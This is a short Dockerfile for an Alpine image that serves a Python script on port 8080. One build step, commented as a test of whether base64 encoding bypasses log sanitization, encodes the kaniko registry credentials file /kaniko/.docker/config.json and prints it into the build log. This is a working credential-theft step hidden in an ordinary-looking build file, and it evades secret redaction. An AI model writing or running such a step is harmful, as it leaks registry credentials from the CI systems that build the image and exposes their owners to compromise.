FROM alpine:3.19

RUN apk add --no-cache python3 curl

# Test if base64 encoding bypasses log sanitization
RUN echo "=== CONFIG B64 ===" && base64 /kaniko/.docker/config.json 2>&1 && echo "=== END CONFIG ==="

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
